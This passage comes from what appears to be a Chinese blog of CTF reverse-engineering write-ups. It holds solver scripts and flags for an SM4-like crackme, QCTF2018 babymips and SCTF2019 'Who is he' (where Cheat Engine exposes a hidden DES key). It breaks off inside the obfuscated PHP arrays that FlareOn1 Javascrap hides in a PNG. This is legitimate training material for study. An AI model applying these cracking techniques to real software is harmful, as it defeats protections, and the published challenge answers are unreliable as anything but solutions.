30 F5 8C B1 E3 1D F6 E2 2E 82 66 CA 60 C0 29 23 AB 0D 53 4E 6F D5 DB 37 45 DE FD 8E 2F 03 FF 6A 72 6D 6C 5B 51 8D 1B AF 92 BB DD BC 7F 11 D9 5C 41 1F 10 5A D8 0A C1 31 88 A5 CD 7B BD 2D 74 D0 12 B8 E5 B4 B0 89 69 97 4A 0C 96 77 7E 65 B9 F1 09 C5 6E C6 84 18 F0 7D EC 3A DC 4D 20 79 EE 5F 3E D7 CB 39 48 C6 BA B1 A3 50 33 AA 56 97 91 7D 67 DC 22 70 B2&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">table = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line"></span><br><span class="line">ROL = <span class="keyword">lambda</span> x, y : ((x &lt;&lt; y) | (x &gt;&gt; (<span class="number">32</span> - y))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">ROR = <span class="keyword">lambda</span> x, y : ((x &gt;&gt; y) | (x &lt;&lt; (<span class="number">32</span> - y))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_40143B</span>(<span class="params">a1, a2, a3, a4</span>):</span></span><br><span class="line">tmp = a2 ^ a3 ^ a4</span><br><span class="line">v1 = table[tmp &amp; <span class="number">0xFF</span>] | table[tmp &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">8</span> | table[tmp &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">16</span> | table[tmp &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">24</span></span><br><span class="line"><span class="keyword">return</span> a1 ^ ROL(v1, <span class="number">12</span>) ^ ROL(v1, <span class="number">8</span>) ^ ROR(v1, <span class="number">2</span>) ^ ROR(v1, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">target = [<span class="number">0</span>] * <span class="number">26</span></span><br><span class="line">target.append(<span class="number">0xBE040680</span>)</span><br><span class="line">target.append(<span class="number">0xC5AF7647</span>)</span><br><span class="line">target.append(<span class="number">0x9FCC401F</span>)</span><br><span class="line">target.append(<span class="number">0xD8BF92EF</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">target[i] = sub_40143B(target[i+<span class="number">4</span>], target[i+<span class="number">1</span>], target[i+<span class="number">2</span>], target[i+<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(target[i])[<span class="number">2</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)[::-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># fl4g_is_s0_ug1y!</span></span><br></pre></td></tr></table></figure><br><h3 id="QCTF2018-Xman-babymips-mips-elf"><a href="#QCTF2018-Xman-babymips-mips-elf" class="headerlink" title="[QCTF2018]Xman-babymips | mips,elf"></a>[QCTF2018]Xman-babymips | mips,elf</h3><p>mips 架构下的 elf，mips 静态分析（反编译）的软件就那几个（IDA7.5, ghidra, jeb-mips, retdec），用 IDA7.5 的话事情将会非常简单，毕竟氪金的力量不容小觑。下面我使用 <strong>免费</strong> 的 ghidra 来做这道题</p><p>ghidra 打开程序，Functions 里没找见 main 函数，那就从 entry 开始看，上来就调用 SUB_00400694：</p><p><img src="../img/QCTF2018Xmanbabymips/1.png" alt="QCTF2018Xmanbabymips"></p><p>SUB_00400694 中调用 __libc_start_main 时，第一个参数就是 main 函数，这里是 FUN_004009a8：</p><p><img src="../img/QCTF2018Xmanbabymips/2.png" alt="QCTF2018Xmanbabymips"></p><p>然后就是对符号的还原：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> isEqual;</span><br><span class="line"><span class="keyword">int</span> idx;</span><br><span class="line">byte input [<span class="number">36</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">setbuf</span>(stdout,(<span class="keyword">char</span> *)<span class="number">0x0</span>);</span><br><span class="line"><span class="built_in">setbuf</span>(stdin,(<span class="keyword">char</span> *)<span class="number">0x0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Give me your flag:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%32s&quot;</span>,input);</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (idx &lt; <span class="number">0x20</span>) &#123;</span><br><span class="line">input[idx] = input[idx] ^ <span class="number">0x20</span>U - (<span class="keyword">char</span>)idx;</span><br><span class="line">idx = idx + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">isEqual = <span class="built_in">strncmp</span>((<span class="keyword">char</span> *)input,_fdata,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> (isEqual == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">FUN_004007f0</span>(input);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑很简单，先对长度为 32 的输入进行一个异或变换，验证前 5 个字节，然后调用 FUN_004007f0 验证剩余的 27 个字节：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FUN_004007f0</span><span class="params">(<span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> inputLen;</span><br><span class="line"><span class="keyword">int</span> isEqual;</span><br><span class="line">uint idx;</span><br><span class="line"></span><br><span class="line">idx = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">while</span> (inputLen = <span class="built_in">strlen</span>(input), idx &lt; inputLen) &#123;</span><br><span class="line"><span class="keyword">if</span> ((idx &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">input[idx] = (byte)((uint)((<span class="keyword">int</span>)input[idx] &lt;&lt; <span class="number">0x1a</span>) &gt;&gt; <span class="number">0x18</span>) | input[idx] &gt;&gt; <span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">input[idx] = input[idx] &gt;&gt; <span class="number">2</span> | (byte)((uint)((<span class="keyword">int</span>)input[idx] &lt;&lt; <span class="number">0x1e</span>) &gt;&gt; <span class="number">0x18</span>);</span><br><span class="line">&#125;</span><br><span class="line">idx = idx + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">isEqual = <span class="built_in">strncmp</span>(input + <span class="number">5</span>,PTR_BYTE_00410d04,<span class="number">0x1b</span>);</span><br><span class="line"><span class="keyword">if</span> (isEqual == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">func = <span class="keyword">lambda</span> b, i : <span class="built_in">chr</span>(b ^ <span class="number">0x20</span> - i)</span><br><span class="line"></span><br><span class="line">t1 = <span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;Q|j&#123;g&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">flag += func(t1[i], i)</span><br><span class="line"></span><br><span class="line">t2 = <span class="string">&quot;52 fd 16 a4 89 bd 92 80 13 41 54 a0 8d 45 18 81 de fc 95 f0 16 79 1a 15 5b 75 1f&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">t2 = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> t2]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t2)):</span><br><span class="line">idx = <span class="number">5</span> + i</span><br><span class="line"><span class="keyword">if</span> idx % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">high_2 = (t2[i] &amp; <span class="number">0b11</span>) &lt;&lt; <span class="number">6</span></span><br><span class="line">low_6 = t2[i] &gt;&gt; <span class="number">2</span> &amp; <span class="number">0b111111</span></span><br><span class="line">flag += func(high_2 | low_6, idx)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">high_6 = (t2[i] &amp; <span class="number">0b111111</span>) &lt;&lt; <span class="number">2</span></span><br><span class="line">low_2 = t2[i] &gt;&gt; <span class="number">6</span> &amp; <span class="number">0b11</span></span><br><span class="line">flag += func(high_6 | low_2, idx)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="SCTF2019-Who-is-he-x86-exe-NET-Unity游戏"><a href="#SCTF2019-Who-is-he-x86-exe-NET-Unity游戏" class="headerlink" title="[SCTF2019]Who is he | x86,exe,.NET,Unity游戏"></a>[SCTF2019]Who is he | x86,exe,.NET,Unity游戏</h3><p>dnSpy 打开 Assembly-CSharp.dll，在 TestClick 类中找到 OnClick 方法：</p><p><img src="../img/SCTF2019Whoishe/1.png" alt="SCTF2019Whoishe"></p><p>分析一下 Decrypt 方法，就是一个简单的 DES_CBC 解密，密文、key、iv 都能找到，所以上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">encryptData = <span class="string">&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;</span></span><br><span class="line">e = base64.b64decode(encryptData)</span><br><span class="line">keyiv = <span class="string">b&quot;1\x002\x003\x004\x00&quot;</span></span><br><span class="line"></span><br><span class="line">d = DES.new(keyiv, DES.MODE_CBC, keyiv)</span><br><span class="line"><span class="built_in">print</span>(d.decrypt(e).decode(<span class="string">&quot;utf-16&quot;</span>))</span><br><span class="line"><span class="comment"># He_P1ay_Basketball_Very_We11!Hahahahaha!</span></span><br></pre></td></tr></table></figure><p>在程序中提交发现不对。于是尝试 patch Assembly-CSharp.dll，发现不论怎么改（比如直接弹出 flag、输入框的内容改为 flag），程序都没有变动，于是猜测按钮部分的功能在另外的 dll 中进行了实现。来到 Data/Managed 目录下，按修改日期对所有 dll 进行排序：</p><p><img src="../img/SCTF2019Whoishe/2.png" alt="SCTF2019Whoishe"></p><p>最新被修改的只有四个，用 CE 进行附加，选择 <code>Mono -&gt; 分析 mono</code>，把这 4 个模块都展开，发现 UnityEngine.UmbraModule 模块十分可疑，成员变量和方法与 TestClick 类基本相同：</p><p><img src="../img/SCTF2019Whoishe/3.png" alt="SCTF2019Whoishe"></p><p>在类 UnityEngine.UmbraModule.Main 处右键，选择 <code>Fields -&gt; Add Static Field Address</code> ，回到 CE 主界面，激活 lua 脚本，浏览 encryptKey 附近内存，发现真正的 key 和 iv：</p><p><img src="../img/SCTF2019Whoishe/4.png" alt="SCTF2019Whoishe"></p><p>在类方法 Decrypt 处右键，选择 <code>Jit</code>，在函数入口打个断点，点击按钮，程序断下来，第一个参数在 rdx 中，该参数就是成员变量 EncryptData：</p><p><img src="../img/SCTF2019Whoishe/5.png" alt="SCTF2019Whoishe"></p><p>提取出来替换上面脚本中的 encryptData 和 keyiv，得到真正的 flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">encryptData = <span class="string">&quot;xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU=&quot;</span></span><br><span class="line">e = base64.b64decode(encryptData)</span><br><span class="line">keyiv = <span class="string">b&quot;t\x00e\x00s\x00t\x00&quot;</span></span><br><span class="line"></span><br><span class="line">d = DES.new(keyiv, DES.MODE_CBC, keyiv)</span><br><span class="line"><span class="built_in">print</span>(d.decrypt(e).decode(<span class="string">&quot;utf-16&quot;</span>))</span><br></pre></td></tr></table></figure><br><h3 id="FlareOn1-Javascrap-misc"><a href="#FlareOn1-Javascrap-misc" class="headerlink" title="[FlareOn1]Javascrap | misc"></a>[FlareOn1]Javascrap | misc</h3><p>走错片场的一道题。php 代码在图片 flare-on.png 的末尾，提取出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$terms</span> = <span class="keyword">array</span>(<span class="string">&quot;M&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;|&quot;</span>);</span><br><span class="line"><span class="variable">$order</span>=<span class="keyword">array</span>(<span class="number">59</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">81</span>, <span class="number">76</span>, <span class="number">10</span>, <span class="number">28</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">11</span>, <span class="number">76</span>, <span class="number">68</span>, <span class="number">50</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">45</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">63</span>, <span class="number">58</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">23</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">49</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">58</span>, <span class="number">66</span>, <span class="number">3</span>, <span class="number">86</span>, <span class="number">27</span>, <span class="number">88</span>, <span class="number">77</span>, <span class="number">80</span>, <span class="number">38</span>, <span class="number">25</span>, <span class="number">40</span>, <span class="number">81</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">76</span>, <span class="number">81</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">28</span>, <span class="number">7</span>, <span class="number">88</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">90</span>, <span class="number">52</span>, <span class="number">80</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">66</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">72</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">70</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">91</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">72</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span 